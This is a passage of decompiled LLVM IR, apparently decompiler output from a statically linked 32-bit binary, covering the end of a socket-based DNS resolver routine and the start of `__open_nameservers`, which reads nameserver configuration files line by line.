  %v1_804c410 = add i32 %v1_804c40f, -8
  %v2_804c410 = inttoptr i32 %v1_804c410 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v2_804c410, align 4
  %v1_804c415 = add i32 %v1_804c40f, -12
  %v2_804c415 = inttoptr i32 %v1_804c415 to i32*
  store i32 134526403, i32* %v2_804c415, align 4
  %v1_804c41a = add i32 %v1_804c40f, 184
  store i32 %v1_804c41a, i32* @esi, align 4
  %v2_804c421 = add i32 %v1_804c40f, -16
  %v3_804c421 = inttoptr i32 %v2_804c421 to i32*
  store i32 %v1_804c41a, i32* %v3_804c421, align 4
  %v2_804c422 = call i32 @__pthread_return_void(i32 -1, i32 %v15_804be94)
  store i32 %v2_804c422, i32* %eax.global-to-local, align 4
  %v0_804c427 = load i32, i32* @esp, align 4
  %v1_804c427 = inttoptr i32 %v0_804c427 to i32*
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %v1_804c427, align 4
  %v1_804c42e = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_804c42e, i32* %eax.global-to-local, align 4
  %v0_804c433 = load i32, i32* @esp, align 4
  %v1_804c433 = inttoptr i32 %v0_804c433 to i32*
  %v2_804c433 = load i32, i32* %v1_804c433, align 4
  store i32 %v2_804c433, i32* @eax, align 4
  %v3_804c433 = add i32 %v0_804c433, 4
  %v1_804c434 = inttoptr i32 %v3_804c433 to i32*
  %v2_804c434 = load i32, i32* %v1_804c434, align 4
  store i32 %v2_804c434, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804c434, align 4
  %v0_804c437 = load i32, i32* @esi, align 4
  store i32 %v0_804c437, i32* %v1_804c433, align 4
  %v0_804c438 = load i32, i32* @global_var_8054998.87, align 8
  store i32 %v0_804c438, i32* %ebx.global-to-local, align 4
  %v2_804c43e = call i32 @__pthread_return_void(i32 -1, i32 %v15_804be94)
  store i32 %v2_804c43e, i32* %eax.global-to-local, align 4
  %v0_804c443 = load i32, i32* @esp, align 4
  %v1_804c443 = add i32 %v0_804c443, 16
  %v1_804c446 = add i32 %v0_804c438, -1
  store i32 %v1_804c446, i32* @ebx, align 4
  %v1_804c447 = add i32 %v0_804c443, 52
  %v2_804c447 = inttoptr i32 %v1_804c447 to i32*
  %v3_804c447 = load i32, i32* %v2_804c447, align 4
  %v5_804c447 = sub i32 %v3_804c447, %v1_804c446
  %v11_804c447 = xor i32 %v3_804c447, %v1_804c446
  %v12_804c447 = xor i32 %v5_804c447, %v3_804c447
  %v13_804c447 = and i32 %v12_804c447, %v11_804c447
  %v14_804c447 = icmp slt i32 %v13_804c447, 0
  %v16_804c447 = icmp slt i32 %v5_804c447, 0
  %v2_804c44b = icmp eq i1 %v16_804c447, %v14_804c447
  br i1 %v2_804c44b, label %dec_label_pc_804c453, label %dec_label_pc_804c44d

dec_label_pc_804c44d:                             ; preds = %dec_label_pc_804c40f
  %v4_804c44d = add i32 %v3_804c447, 1
  store i32 %v4_804c44d, i32* %v2_804c447, align 4
  br label %dec_label_pc_804c474.backedge

dec_label_pc_804c453:                             ; preds = %dec_label_pc_804c0dc, %dec_label_pc_804c40f, %dec_label_pc_804c408, %dec_label_pc_804c0f3
  %v1_804c460 = phi i32 [ %v1_804c443, %dec_label_pc_804c40f ], [ %v1_804c40f, %dec_label_pc_804c408 ], [ %v1_804c12f, %dec_label_pc_804c0f3 ], [ %v0_804c453.pre, %dec_label_pc_804c0dc ]
  %v1_804c453 = add i32 %v1_804c460, 40
  %v2_804c453 = inttoptr i32 %v1_804c453 to i32*
  %v3_804c453 = load i32, i32* %v2_804c453, align 4
  %v1_804c457 = add i32 %v3_804c453, 1
  store i32 %v1_804c457, i32* %eax.global-to-local, align 4
  %v1_804c458 = ashr i32 %v1_804c457, 31
  store i32 %v1_804c458, i32* %edx.global-to-local, align 4
  %v1_804c459 = add i32 %v1_804c460, 248
  %v2_804c459 = inttoptr i32 %v1_804c459 to i32*
  %v3_804c459 = load i32, i32* %v2_804c459, align 4
  %v5_804c459 = zext i32 %v1_804c457 to i64
  %v7_804c459 = zext i32 %v1_804c458 to i64
  %v8_804c459 = mul nuw i64 %v7_804c459, 4294967296
  %v9_804c459 = or i64 %v8_804c459, %v5_804c459
  %v10_804c459 = zext i32 %v3_804c459 to i64
  %v11_804c459 = sdiv i64 %v9_804c459, %v10_804c459
  %v12_804c459 = trunc i64 %v11_804c459 to i32
  store i32 %v12_804c459, i32* %eax.global-to-local, align 4
  %v13_804c459 = srem i64 %v9_804c459, %v10_804c459
  %v14_804c459 = trunc i64 %v13_804c459 to i32
  store i32 %v14_804c459, i32* %edx.global-to-local, align 4
  store i32 %v14_804c459, i32* %v2_804c453, align 4
  %v1_804c464 = icmp eq i32 %v14_804c459, 0
  %v1_804c466 = icmp eq i1 %v1_804c464, false
  br i1 %v1_804c466, label %dec_label_pc_804c46c, label %dec_label_pc_804c468

dec_label_pc_804c468:                             ; preds = %dec_label_pc_804c453
  %v0_804c468 = load i32, i32* @esp, align 4
  %v1_804c468 = add i32 %v0_804c468, 28
  %v2_804c468 = inttoptr i32 %v1_804c468 to i32*
  %v3_804c468 = load i32, i32* %v2_804c468, align 4
  %v4_804c468 = add i32 %v3_804c468, 1
  store i32 %v4_804c468, i32* %v2_804c468, align 4
  br label %dec_label_pc_804c46c

dec_label_pc_804c46c:                             ; preds = %dec_label_pc_804c453, %dec_label_pc_804c468
  %v0_804c46c = load i32, i32* @esp, align 4
  %v1_804c46c = add i32 %v0_804c46c, 36
  %v2_804c46c = inttoptr i32 %v1_804c46c to i32*
  store i32 -1, i32* %v2_804c46c, align 4
  br label %dec_label_pc_804c474.backedge

dec_label_pc_804c474.backedge:                    ; preds = %dec_label_pc_804c46c, %dec_label_pc_804c0ea, %dec_label_pc_804c1d8, %dec_label_pc_804c44d
  %v0_804c474.pre = load i32, i32* @esp, align 4
  %v1_804c474 = add i32 %v0_804c474.pre, 28
  %v2_804c474 = inttoptr i32 %v1_804c474 to i32*
  %v3_804c474 = load i32, i32* %v2_804c474, align 4
  %tmp121 = icmp ult i32 %v3_804c474, 3
  br i1 %tmp121, label %dec_label_pc_804bed4, label %dec_label_pc_804c499

dec_label_pc_804c499:                             ; preds = %dec_label_pc_804be4e, %dec_label_pc_804beea, %dec_label_pc_804bfde, %dec_label_pc_804c474.backedge, %entry, %dec_label_pc_804be28, %dec_label_pc_804be30, %dec_label_pc_804be3e
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_804be3e ], [ -1, %dec_label_pc_804be30 ], [ -1, %dec_label_pc_804be28 ], [ -1, %entry ], [ %v0_804be9b, %dec_label_pc_804c474.backedge ], [ %v0_804be9b, %dec_label_pc_804bfde ], [ %v0_804be9b, %dec_label_pc_804beea ], [ %v0_804be9b, %dec_label_pc_804be4e ]
  %v0_804c499 = call i32 @__GI___h_errno_location()
  store i32 %v0_804c499, i32* %eax.global-to-local, align 4
  %v1_804c49e = inttoptr i32 %v0_804c499 to i32*
  store i32 -1, i32* %v1_804c49e, align 4
  %v0_804c4a4 = load i32, i32* @esp, align 4
  %v1_804c4a4 = add i32 %v0_804c4a4, 44
  %v2_804c4a4 = inttoptr i32 %v1_804c4a4 to i32*
  %v3_804c4a4 = load i32, i32* %v2_804c4a4, align 4
  store i32 %v3_804c4a4, i32* %eax.global-to-local, align 4
  %v2_804c4a8 = add i32 %v0_804c4a4, 56
  %v3_804c4a8 = inttoptr i32 %v2_804c4a8 to i32*
  store i32 %v3_804c4a4, i32* %v3_804c4a8, align 4
  br label %dec_label_pc_804c4ac

dec_label_pc_804c4ac:                             ; preds = %dec_label_pc_804c211, %dec_label_pc_804c1e9, %dec_label_pc_804c499
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_804c499 ], [ %v0_804be9b, %dec_label_pc_804c211 ], [ %v0_804be9b, %dec_label_pc_804c1e9 ]
  %v0_804c4ac = load i32, i32* @esp, align 4
  %v1_804c4ac = add i32 %v0_804c4ac, 20
  %v2_804c4ac = inttoptr i32 %v1_804c4ac to i32*
  %v3_804c4ac = load i32, i32* %v2_804c4ac, align 4
  %v13_804c4ac = icmp eq i32 %v3_804c4ac, -1
  br i1 %v13_804c4ac, label %dec_label_pc_804c4ac.dec_label_pc_804c4c2_crit_edge, label %dec_label_pc_804c4b3

dec_label_pc_804c4ac.dec_label_pc_804c4c2_crit_edge: ; preds = %dec_label_pc_804c4ac
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_804c4c2

dec_label_pc_804c4b3:                             ; preds = %dec_label_pc_804c4ac
  %v3_804c4b6 = load i32, i32* %v2_804c4ac, align 4
  %v5_804c4b6 = add i32 %v0_804c4ac, -16
  %v6_804c4b6 = inttoptr i32 %v5_804c4b6 to i32*
  store i32 %v3_804c4b6, i32* %v6_804c4b6, align 4
  %v1_804c4ba = sext i16 %stack_var_-192.1 to i32
  %v2_804c4ba = call i32 @__libc_close(i32 %v1_804c4ba)
  store i32 %v2_804c4ba, i32* %eax.global-to-local, align 4
  %v0_804c4bf = load i32, i32* @esp, align 4
  %v1_804c4bf = add i32 %v0_804c4bf, 16
  br label %dec_label_pc_804c4c2

dec_label_pc_804c4c2:                             ; preds = %dec_label_pc_804c4ac.dec_label_pc_804c4c2_crit_edge, %dec_label_pc_804c4b3
  %v1_804c4c9.pre-phi = phi i32 [ %.pre, %dec_label_pc_804c4ac.dec_label_pc_804c4c2_crit_edge ], [ %v1_804c4ba, %dec_label_pc_804c4b3 ]
  %v0_804c4c2 = phi i32 [ %v0_804c4ac, %dec_label_pc_804c4ac.dec_label_pc_804c4c2_crit_edge ], [ %v1_804c4bf, %dec_label_pc_804c4b3 ]
  %v1_804c4c5 = add i32 %v0_804c4c2, 12
  %v2_804c4c5 = inttoptr i32 %v1_804c4c5 to i32*
  %v3_804c4c5 = load i32, i32* %v2_804c4c5, align 4
  %v5_804c4c5 = add i32 %v0_804c4c2, -16
  %v6_804c4c5 = inttoptr i32 %v5_804c4c5 to i32*
  store i32 %v3_804c4c5, i32* %v6_804c4c5, align 4
  %v2_804c4c9 = call i32 @free(i32 %v1_804c4c9.pre-phi)
  store i32 %v2_804c4c9, i32* %eax.global-to-local, align 4
  %v1_804c4ce = load i32, i32* @esp, align 4
  %v2_804c4ce = inttoptr i32 %v1_804c4ce to i32*
  store i32 %v2_804be06, i32* %v2_804c4ce, align 4
  %v2_804c4d1 = call i32 @free(i32 %v1_804c4c9.pre-phi)
  store i32 %v2_804c4d1, i32* @eax, align 4
  %v0_804c4d6 = load i32, i32* @esp, align 4
  %v1_804c4d9 = add i32 %v0_804c4d6, 32
  %v2_804c4d9 = inttoptr i32 %v1_804c4d9 to i32*
  store i32 -1, i32* %v2_804c4d9, align 4
  %v0_804c4e1 = load i32, i32* @esp, align 4
  %v1_804c4e1 = add i32 %v0_804c4e1, 40
  %v2_804c4e1 = inttoptr i32 %v1_804c4e1 to i32*
  %v3_804c4e1 = load i32, i32* %v2_804c4e1, align 4
  %v13_804c4e1 = icmp eq i32 %v3_804c4e1, -1
  br i1 %v13_804c4e1, label %dec_label_pc_804c535, label %dec_label_pc_804c4e8

dec_label_pc_804c4e8:                             ; preds = %dec_label_pc_804c4c2
  %v0_804c4e8 = load i32, i32* @ecx, align 4
  %v2_804c4e8 = add i32 %v0_804c4e1, -4
  %v3_804c4e8 = inttoptr i32 %v2_804c4e8 to i32*
  store i32 %v0_804c4e8, i32* %v3_804c4e8, align 4
  %v1_804c4e9 = add i32 %v0_804c4e1, -8
  %v2_804c4e9 = inttoptr i32 %v1_804c4e9 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v2_804c4e9, align 4
  %v1_804c4ee = add i32 %v0_804c4e1, -12
  %v2_804c4ee = inttoptr i32 %v1_804c4ee to i32*
  store i32 134526403, i32* %v2_804c4ee, align 4
  %v1_804c4f3 = add i32 %v0_804c4e1, 184
  store i32 %v1_804c4f3, i32* %ebx.global-to-local, align 4
  %v2_804c4fa = add i32 %v0_804c4e1, -16
  %v3_804c4fa = inttoptr i32 %v2_804c4fa to i32*
  store i32 %v1_804c4f3, i32* %v3_804c4fa, align 4
  %v3_804c4fb = call i32 @__pthread_return_void(i32 %v1_804c4c9.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c4fb, i32* %eax.global-to-local, align 4
  %v0_804c500 = load i32, i32* @esp, align 4
  %v1_804c500 = inttoptr i32 %v0_804c500 to i32*
  store i32 ptrtoint (i8** @global_var_8052528.84 to i32), i32* %v1_804c500, align 4
  %v2_804c507 = call i32 @__pthread_return_0(i32 %v1_804c4c9.pre-phi)
  store i32 %v2_804c507, i32* %eax.global-to-local, align 4
  %v0_804c50c = load i32, i32* @esp, align 4
  %v1_804c50c = add i32 %v0_804c50c, 56
  %v2_804c50c = inttoptr i32 %v1_804c50c to i32*
  %v3_804c50c = load i32, i32* %v2_804c50c, align 4
  store i32 %v3_804c50c, i32* %edx.global-to-local, align 4
  %v1_804c510 = add i32 %v0_804c50c, 72
  %v2_804c510 = inttoptr i32 %v1_804c510 to i32*
  %v3_804c510 = load i32, i32* %v2_804c510, align 4
  store i32 %v3_804c510, i32* %eax.global-to-local, align 4
  %v1_804c514 = sext i32 %v3_804c50c to i64
  store i64 %v1_804c514, i64* @global_var_8052540.85, align 64
  %v1_804c51a = trunc i32 %v3_804c510 to i16
  store i16 %v1_804c51a, i16* @global_var_805215c.86, align 4
  %v1_804c520 = inttoptr i32 %v0_804c50c to i32*
  %v2_804c520 = load i32, i32* %v1_804c520, align 4
  store i32 %v2_804c520, i32* @eax, align 4
  %v3_804c520 = add i32 %v0_804c50c, 4
  %v1_804c521 = inttoptr i32 %v3_804c520 to i32*
  %v2_804c521 = load i32, i32* %v1_804c521, align 4
  store i32 %v2_804c521, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_804c521, align 4
  %v0_804c524 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c524, i32* %v1_804c520, align 4
  %v3_804c525 = call i32 @__pthread_return_void(i32 %v1_804c4c9.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c525, i32* %eax.global-to-local, align 4
  %v0_804c52a = load i32, i32* @esp, align 4
  %v1_804c52a = add i32 %v0_804c52a, 32
  %v2_804c52a = inttoptr i32 %v1_804c52a to i32*
  store i32 -1, i32* %v2_804c52a, align 4
  br label %dec_label_pc_804c532

dec_label_pc_804c532:                             ; preds = %dec_label_pc_804c3a6, %dec_label_pc_804c4e8
  %v0_804c532 = load i32, i32* @esp, align 4
  %v1_804c532 = add i32 %v0_804c532, 16
  br label %dec_label_pc_804c535

dec_label_pc_804c535:                             ; preds = %dec_label_pc_804c4c2, %dec_label_pc_804c532
  %v0_804c535 = phi i32 [ %v0_804c4e1, %dec_label_pc_804c4c2 ], [ %v1_804c532, %dec_label_pc_804c532 ]
  %v1_804c535 = add i32 %v0_804c535, 16
  %v2_804c535 = inttoptr i32 %v1_804c535 to i32*
  %v3_804c535 = load i32, i32* %v2_804c535, align 4
  store i32 %v3_804c535, i32* %eax.global-to-local, align 4
  %v1_804c539 = add i32 %v0_804c535, 220
  %v1_804c53f = inttoptr i32 %v1_804c539 to i32*
  %v2_804c53f = load i32, i32* %v1_804c53f, align 4
  store i32 %v2_804c53f, i32* @ebx, align 4
  %v3_804c53f = add i32 %v0_804c535, 224
  %v1_804c540 = inttoptr i32 %v3_804c53f to i32*
  %v2_804c540 = load i32, i32* %v1_804c540, align 4
  store i32 %v2_804c540, i32* @esi, align 4
  %v3_804c540 = add i32 %v0_804c535, 228
  %v1_804c541 = inttoptr i32 %v3_804c540 to i32*
  %v2_804c541 = load i32, i32* %v1_804c541, align 4
  store i32 %v2_804c541, i32* @edi, align 4
  %v3_804c541 = add i32 %v0_804c535, 232
  %v1_804c542 = inttoptr i32 %v3_804c541 to i32*
  %v2_804c542 = load i32, i32* %v1_804c542, align 4
  store i32 %v2_804c542, i32* @ebp, align 4
  ret i32 %v3_804c535

; uselistorder directives
  uselistorder i32 %v0_804c535, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c50c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c4e1, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804c4c2, { 1, 0 }
  uselistorder i32 %v1_804c4c9.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_804c474.pre, { 1, 0 }
  uselistorder i32 %v5_804c447, { 1, 0 }
  uselistorder i32 %v3_804c447, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c40f, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_804c3d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804c3a6, { 1, 0 }
  uselistorder i32 %v3_804c385, { 1, 0, 2 }
  uselistorder i32 %v0_804c376, { 1, 0 }
  uselistorder i32 %v5_804c36c, { 1, 0 }
  uselistorder i32* %v3_804c36c, { 1, 0 }
  uselistorder i32 %v0_804c24282, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_804c36c, { 2, 1, 0 }
  uselistorder i32 %v5_804c366, { 1, 0 }
  uselistorder i32 %v1_804c365, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c361, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c325, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_804c2ff, { 1, 0 }
  uselistorder i32 %v1_804c2f0, { 1, 0 }
  uselistorder i32 %v0_804c2af, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_804c256, { 1, 2, 0 }
  uselistorder i32 %v0_804c256, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_804c230, { 1, 0 }
  uselistorder i32 %v1_804c22a, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804c225, { 1, 2, 0 }
  uselistorder i32 %v5_804c23059, { 1, 0 }
  uselistorder i32 %v5_804c1d2, { 1, 0 }
  uselistorder i32 %v3_804c1d2, { 2, 0, 1, 3 }
  uselistorder i32 %v3_804c18a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804c170, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_804c170, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_804c14f, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c12f, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804c0d5, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_804c0ba, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_804c0a3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c02b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c018, { 3, 0, 1, 2 }
  uselistorder i32 %v1_804bfde, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804bfbf, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_804bfa3, { 1, 0 }
  uselistorder i32 %v3_804bf98, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_804bf95, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_804bf3a, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_804bf35, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804bf1e, { 1, 0 }
  uselistorder i32 %v1_804beea, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804bedb93, { 2, 1, 0 }
  uselistorder i32 %v3_804bef3, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i16 %v0_804be9b, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_804be94, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_804be06, { 8, 7, 5, 9, 4, 2, 1, 10, 0, 3, 11, 6, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 78, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 66, 62, 63, 64, 65, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 72, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 10000, { 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 1, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i16* @global_var_805215c.86, { 2, 1, 0 }
  uselistorder i64* @global_var_8052540.85, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8052528.84 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8052528.84, { 1, 0 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804c535, { 1, 0 }
  uselistorder label %dec_label_pc_804c532, { 1, 0 }
  uselistorder label %dec_label_pc_804c4c2, { 1, 0 }
  uselistorder label %dec_label_pc_804c4ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c499, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_804c474.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c46c, { 1, 0 }
  uselistorder label %dec_label_pc_804c453, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_804c408, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_804c3a6, { 1, 0 }
  uselistorder label %dec_label_pc_804c376, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_804c36c, { 1, 0 }
  uselistorder label %dec_label_pc_804c361, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c35e, { 1, 0 }
  uselistorder label %dec_label_pc_804c2d9, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c221, { 1, 0 }
  uselistorder label %dec_label_pc_804c0a3, { 1, 0 }
  uselistorder label %dec_label_pc_804c06c, { 1, 0 }
  uselistorder label %dec_label_pc_804bfde, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804beea, { 1, 0 }
  uselistorder label %dec_label_pc_804bed4, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_804c544 = load i32, i32* @ebp, align 4
  store i32 134526403, i32* %stack_var_-216, align 4
  %v3_804c553 = ptrtoint i32* %stack_var_-216 to i32
  %v2_804c558 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c558, i32* @eax, align 4
  %v2_804c560 = call i32 @__pthread_return_void(i32 %v2_804c558, i32 134526403)
  %v1_804c56c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052160.32 to i32))
  store i32 %v1_804c56c, i32* @eax, align 4
  %v0_804c574 = load i32, i32* @global_var_8054994.33, align 4
  %tmp43 = icmp slt i32 %v0_804c574, 1
  %tmp44 = icmp eq i1 %tmp43, false
  br i1 %tmp44, label %dec_label_pc_804c76b, label %dec_label_pc_804c581

dec_label_pc_804c581:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_80505fe.89 to i32), i32* %stack_var_-216, align 4
  %v2_804c58d = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_80505cc.90 to i32), i32 ptrtoint (i32* @global_var_80505fe.89 to i32))
  store i32 %v2_804c58d, i32* @eax, align 4
  store i32 %v2_804c58d, i32* @ebp, align 4
  %v1_804c597 = icmp eq i32 %v2_804c58d, 0
  %v1_804c599 = icmp eq i1 %v1_804c597, false
  br i1 %v1_804c599, label %dec_label_pc_804c736.preheader, label %dec_label_pc_804c59f

dec_label_pc_804c59f:                             ; preds = %dec_label_pc_804c581
  store i32 ptrtoint (i32* @global_var_80505fe.89 to i32), i32* %stack_var_-216, align 4
  %v2_804c5ab = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_80505dd.91 to i32), i32 ptrtoint (i32* @global_var_80505fe.89 to i32))
  store i32 %v2_804c5ab, i32* @ebp, align 4
  %v1_804c5b5 = icmp eq i32 %v2_804c5ab, 0
  %v1_804c5b7 = icmp eq i1 %v1_804c5b5, false
  br i1 %v1_804c5b7, label %dec_label_pc_804c736.preheader, label %dec_label_pc_804c760

dec_label_pc_804c736.preheader:                   ; preds = %dec_label_pc_804c581, %dec_label_pc_804c59f
  %v2_804c73d = ptrtoint i32* %stack_var_-180 to i32
  %v3_804c671 = add i32 %v3_804c553, 164
  %v0_804c736103 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804c73d, i32* @ebx, align 4
  %v3_804c742104 = call i32 @fgets(i32 %v2_804c73d, i32 128, i32 %v0_804c736103)
  store i32 %v3_804c742104, i32* @eax, align 4
  %v1_804c74a105 = icmp eq i32 %v3_804c742104, 0
  %v1_804c74c106 = icmp eq i1 %v1_804c74a105, false
  br i1 %v1_804c74c106, label %dec_label_pc_804c5c3.preheader.lr.ph, label %dec_label_pc_804c752

dec_label_pc_804c5c3.preheader.lr.ph:             ; preds = %dec_label_pc_804c736.preheader
  %v4_804c65b = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_804c5c3.preheader

dec_label_pc_804c5c2:                             ; preds = %dec_label_pc_804c5cd
  %v1_804c5c2 = add i32 %v0_804c5c257, 1
  store i32 %v1_804c5c2, i32* @ebx, align 4
  %v1_804c5c3 = inttoptr i32 %v1_804c5c2 to i8*
  %v2_804c5c3 = load i8, i8* %v1_804c5c3, align 1
  %v3_804c5c3 = zext i8 %v2_804c5c3 to i32
  %v5_804c5c3 = and i32 %v6_804c5c360, -256
  %v6_804c5c3 = or i32 %v3_804c5c3, %v5_804c5c3
  store i32 %v6_804c5c3, i32* @ecx, align 4
  %v4_804c5c5 = icmp eq i8 %v2_804c5c3, 0
  br i1 %v4_804c5c5, label %dec_label_pc_804c736.backedge, label %dec_label_pc_804c5cd

dec_label_pc_804c5cd:                             ; preds = %dec_label_pc_804c5cd.lr.ph, %dec_label_pc_804c5c2
  %v6_804c5c360 = phi i32 [ %v6_804c5c355, %dec_label_pc_804c5cd.lr.ph ], [ %v6_804c5c3, %dec_label_pc_804c5c2 ]
  %v2_804c5c359 = phi i8 [ %v2_804c5c352, %dec_label_pc_804c5cd.lr.ph ], [ %v2_804c5c3, %dec_label_pc_804c5c2 ]
  %v1_804c5c358 = phi i8* [ %v1_804c5c351, %dec_label_pc_804c5cd.lr.ph ], [ %v1_804c5c3, %dec_label_pc_804c5c2 ]
  %v0_804c5c257 = phi i32 [ %v0_804c5c3.pre, %dec_label_pc_804c5cd.lr.ph ], [ %v1_804c5c2, %dec_label_pc_804c5c2 ]
  %v2_804c5cd = sext i8 %v2_804c5c359 to i32
  store i32 %v2_804c5cd, i32* @edx, align 4
  store i32 %v0_804c5d0.pre, i32* @eax, align 4
  %v2_804c5d5 = mul nsw i32 %v2_804c5cd, 2
  %v3_804c5d5 = add i32 %v0_804c5d0.pre, %v2_804c5d5
  %v4_804c5d5 = inttoptr i32 %v3_804c5d5 to i8*
  %v5_804c5d5 = load i8, i8* %v4_804c5d5, align 1
  %v6_804c5d5 = and i8 %v5_804c5d5, 32
  %v7_804c5d5 = icmp eq i8 %v6_804c5d5, 0
  %v1_804c5d9 = icmp eq i1 %v7_804c5d5, false
  br i1 %v1_804c5d9, label %dec_label_pc_804c5c2, label %dec_label_pc_804c5db

dec_label_pc_804c5db:                             ; preds = %dec_label_pc_804c5cd
  %v10_804c5db = icmp eq i8 %v2_804c5c359, 10
  br i1 %v10_804c5db, label %dec_label_pc_804c736.backedge, label %dec_label_pc_804c5e4

dec_label_pc_804c736.backedge:                    ; preds = %dec_label_pc_804c5c3.preheader, %dec_label_pc_804c5c2, %dec_label_pc_804c6fc, %dec_label_pc_804c72b, %dec_label_pc_804c703, %dec_label_pc_804c5db, %dec_label_pc_804c5e4, %dec_label_pc_804c6b5
  %v0_804c736 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804c73d, i32* @ebx, align 4
  %v3_804c742 = call i32 @fgets(i32 %v2_804c73d, i32 128, i32 %v0_804c736)
  store i32 %v3_804c742, i32* @eax, align 4
  %v1_804c74a = icmp eq i32 %v3_804c742, 0
  %v1_804c74c = icmp eq i1 %v1_804c74a, false
